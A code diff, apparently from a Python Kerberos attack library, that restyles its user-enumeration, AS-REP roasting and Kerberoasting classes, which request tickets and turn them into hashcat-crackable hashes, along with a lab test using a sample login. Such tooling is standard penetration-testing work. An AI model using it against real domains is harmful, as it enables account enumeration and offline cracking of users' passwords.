@@ -35,8 +35,10 @@ class KerberosUserEnum:
 
 	def construct_tgt_req(self):
 		now = now = datetime.datetime.now(datetime.timezone.utc)
-		kdc_req_body = {}
-		kdc_req_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','proxiable']))
+		kdc_req_body = {
+			'kdc-options': KDCOptions({'forwardable', 'renewable', 'proxiable'})
+		}
+
 		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [self.spn.username]})
 		kdc_req_body['realm'] = self.spn.domain.upper()
 		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', self.spn.domain.upper()]})
@@ -44,17 +46,17 @@ class KerberosUserEnum:
 		kdc_req_body['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
 		kdc_req_body['nonce'] = secrets.randbits(31)
 		kdc_req_body['etype'] = [2, 3, 16, 23, 17, 18] #we "support" all MS related enctypes
-		
-		pa_data_1 = {}
-		pa_data_1['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
+
+		pa_data_1 = {'padata-type': int(PADATA_TYPE('PA-PAC-REQUEST'))}
 		pa_data_1['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
-		
-		kdc_req = {}
-		kdc_req['pvno'] = krb5_pvno
-		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_AS_REQ.value
-		kdc_req['padata'] = [pa_data_1]
-		kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
-		
+
+		kdc_req = {
+			'pvno': krb5_pvno,
+			'msg-type': MESSAGE_TYPE.KRB_AS_REQ.value,
+			'padata': [pa_data_1],
+			'req-body': KDC_REQ_BODY(kdc_req_body),
+		}
+
 		return AS_REQ(kdc_req)
 
 	async def run(self):
@@ -87,7 +89,10 @@ class APREPRoast:
 			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
 			return TGTTicket2hashcat(kcomm.kerberos_TGT)
 		except Exception as e:
-			logger.debug('Error while roasting client %s/%s Reason: %s' % (cred.domain, cred.username, str(e)))
+			logger.debug(
+				f'Error while roasting client {cred.domain}/{cred.username} Reason: {str(e)}'
+			)
+
 			raise e
 
 class Kerberoast:
@@ -101,7 +106,7 @@ class Kerberoast:
 			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
 		except Exception as e:
 			logger.exception('a')
-			logger.debug('Error logging in! Reason: %s' % (str(e)))
+			logger.debug(f'Error logging in! Reason: {str(e)}')
 			raise e
 
 		results = []
@@ -111,7 +116,10 @@ class Kerberoast:
 				results.append(TGSTicket2hashcat(tgs))
 			except Exception as e:
 				logger.exception('b')
-				logger.debug('Failed to get TGS ticket for user %s/%s/%s! Reason: %s' % (spn.domain, str(spn.service), spn.username, str(e)))
+				logger.debug(
+					f'Failed to get TGS ticket for user {spn.domain}/{str(spn.service)}/{spn.username}! Reason: {str(e)}'
+				)
+
 				continue
 
 		return results
@@ -126,7 +134,7 @@ async def main():
 	ue = KerberosUserEnum(target, spn)
 	res = await ue.run()
 	print(res)
-	
+
 	url = 'kerberos+pw://TEST\\asreptest:pass@10.10.10.2'
 	ku = KerberosClientURL.from_url(url)
 	target = ku.get_target()
